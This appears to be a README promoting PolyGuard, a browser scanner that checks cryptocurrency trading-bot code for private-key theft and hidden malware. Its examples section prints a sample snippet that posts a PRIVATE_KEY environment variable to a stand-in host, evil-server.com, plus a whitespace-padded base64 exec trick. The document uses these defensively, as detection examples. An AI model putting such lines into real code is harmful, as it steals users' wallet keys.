# 🛡️ PolyGuard — Scan Trading Bots for Malware Before You Run Them

**Don't get rekt.** Check any trading bot code for private key theft, hidden malware, and credential exfiltration — in seconds.

[![Live Scanner](https://img.shields.io/badge/Try%20Now-poly--guard.vercel.app-blue?style=for-the-badge)](https://poly-guard.vercel.app)

---

## The Problem

You found a trading bot on GitHub, Discord, or Telegram. It promises profits. You're about to paste in your private key and run it.

**But is it safe?**

In the past year, malicious trading bots have stolen **$500,000+** from people just like you:

| Attack | What Happened | Loss |
|--------|---------------|------|
| **Trust412** | Polymarket copy-trading bot with hidden code that stole private keys via fake `validate_mcp` function | Unknown |
| **GitVenom** | 200+ fake GitHub repos with malware hidden after 2000+ tab/space characters | $485,000+ |
| **py-clob-clients** | Typosquatted package mimicking official Polymarket SDK | Ongoing |

These aren't sophisticated hacks. They're **traps for regular users** who download code and run it without checking.

---

## The Solution

**PolyGuard scans code before you run it.**

1. Paste the bot code (or upload the file)
2. Get instant results: safe ✅ or dangerous 🚨
3. See exactly which lines are malicious and why

No technical skills required. No installation. Just paste and scan.

👉 **[Scan Your Code Now](https://poly-guard.vercel.app)**

---

## What PolyGuard Detects

### 🔑 Private Key Theft
- Environment variable exfiltration (`PRIVATE_KEY`, `WALLET_SECRET`)
- Credential harvesting from config files
- Data transmission to external servers

### 🎭 Obfuscated Malware
- Base64/hex encoded payloads
- Whitespace-hidden code (GitVenom technique)
- Packed or minified malicious scripts

### 📦 Malicious Dependencies
- Known dangerous packages (`excluder-mcp-package`, fake SDK clones)
- Typosquatted npm/pip libraries
- Supply chain attack patterns

### 🤖 AI-Powered Analysis
- GPT-4 deep code review
- Context-aware threat detection
- Novel attack pattern recognition

---

## Who This Is For

- **Traders** downloading bots from GitHub/Discord/Telegram
- **Copy traders** using automation tools on Polymarket, Hyperliquid, dYdX
- **Crypto investors** running wallet management scripts
- **Developers** auditing third-party code before integration
- **Anyone** about to paste their private key into code they didn't write

---

## Real Examples

### ❌ Dangerous Code (Caught by PolyGuard)

```python
import requests
import os

# Looks innocent...
pk = os.environ.get("PRIVATE_KEY")
config = {"wallet": pk, "settings": load_config()}

# But this line steals your keys
requests.post("https://evil-server.com/collect", json=config)
```

**PolyGuard flags:** `Credential exfiltration to external endpoint`

### ❌ Hidden Malware (GitVenom Style)

```python
def setup():
    print("Initializing bot...")
                                                                                                    exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzO..."))
```

**PolyGuard flags:** `Obfuscated code execution after whitespace padding`

---

## Quick Start

**Option 1: Use the web scanner (recommended)**

Visit [poly-guard.vercel.app](https://poly-guard.vercel.app) and paste your code.

**Option 2: Check a GitHub repo**

Before cloning any trading bot:
1. Copy the main script contents
2. Paste into PolyGuard
3. Only proceed if it passes

---

## FAQ

**Q: Is this free?**  
A: Yes. 3 free scans per day. More than enough to check a bot before running it.

**Q: What languages does it support?**  
A: Python, JavaScript, TypeScript, and shell scripts — the most common languages for trading bots.

**Q: Can I trust PolyGuard itself?**  
A: The scanner runs entirely in the browser. Your code is analyzed but never stored.

**Q: Does this guarantee safety?**  
A: No scanner is 100% foolproof. PolyGuard catches known attack patterns and suspicious behaviors. Always use a separate wallet for testing bots with small amounts first.

---

## Recent Threats Detected

PolyGuard's detection patterns are updated based on real attacks in the wild:

- ✅ **Trust412 patterns** — `validate_mcp`, `excluder-mcp-package`
- ✅ **GitVenom techniques** — whitespace obfuscation, hidden `exec()` calls
- ✅ **Clipboard hijackers** — wallet address replacement
- ✅ **Telegram exfiltration** — data theft via bot APIs
- ✅ **Fake SDK packages** — typosquatted Polymarket/Hyperliquid libraries

---

## Protect Yourself

Before running **any** trading bot:

1. 🔍 **Scan it with PolyGuard** → [poly-guard.vercel.app](https://poly-guard.vercel.app)
2. 💰 **Use a fresh wallet** with only test funds
3. 🔐 **Never reuse private keys** from your main wallet
4. 👀 **Check the repo history** for suspicious commits
5. ⚠️ **If it seems too good to be true**, it probably is

---

## Links

- 🌐 **Scanner:** [poly-guard.vercel.app](https://poly-guard.vercel.app)
- 🐦 **Updates:** [@polyguard](https://twitter.com/polyguard)
- 💬 **Report threats:** [Open an issue](https://github.com/user/polyguard/issues)

---

<p align="center">
  <b>Stop. Scan. Then run.</b><br>
  <a href="https://poly-guard.vercel.app">Check your bot now →</a>
</p>

---

### Keywords

`polymarket bot scam` · `trading bot malware` · `trust412 malware` · `gitvenom` · `crypto bot security` · `private key theft` · `polymarket copy trading bot safe` · `check github code for malware` · `trading bot virus` · `is this trading bot safe` · `polymarket bot checker` · `crypto code scanner` · `detect malicious python code` · `github malware scanner`
